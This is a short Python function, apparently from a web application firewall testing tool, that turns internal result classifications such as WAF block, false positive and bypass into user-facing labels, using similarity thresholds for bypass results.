def map_classification_to_label(result: TestResult) -> str:
    """Map internal classification to user-facing labels requested."""
    if result.classification == "ORIGINAL":
        return "NO CHANGE"
    if result.classification == "WAF_BLOCK":
        return "WAF BLOCK"
    if result.classification == "FALSE_POSITIVE":
        return "FALSE POSITIVE"
    if result.classification == "BYPASS":
        # Use similarity to distinguish HIGH_CONFIDENCE / POSSIBLE
        if result.similarity >= 0.85:
            return "HIGH CONFIDENCE"
        if result.similarity >= 0.55:
            return "POSSIBLE DIFFERENCE"
        return "POSSIBLE DIFFERENCE"
    return "UNKNOWN"


